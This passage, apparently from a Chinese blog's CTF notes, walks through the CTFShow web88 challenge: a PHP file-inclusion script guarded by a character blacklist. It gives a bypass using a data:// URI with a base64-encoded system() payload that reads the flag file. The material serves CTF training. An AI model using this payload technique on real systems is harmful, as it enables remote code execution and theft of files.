-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-17 02:27:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>分析:</strong></p>
-<ol>
-<li>正则表达是 匹配了 一大堆东西:</li>
-<li>php , ~, ! , @, #, $, %, ^, &amp;, *, ( ), -, _, +, = .  把键盘数字哪一行都过滤了</li>
-</ol>
-<p><strong>实验：</strong></p>
-<ol>
-<li>使用 data:// 协议</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZioucGhwJyk7Pz4</span></span><br><span class="line"><span class="comment">//<span class="meta">&lt;?php</span> system(&#x27;tac f*.php&#x27;);<span class="meta">?&gt;</span> 的 base64 编码为PD9waHAgc3lzdGVtKCd0YWMgZioucGhwJyk7Pz4= </span></span><br><span class="line"><span class="comment">// 因为 题目过滤了 = （等号） 所以在使用时 删掉</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web88.png"></p>
 ]]></content>
       <categories>
         <category>CTF笔记</category>
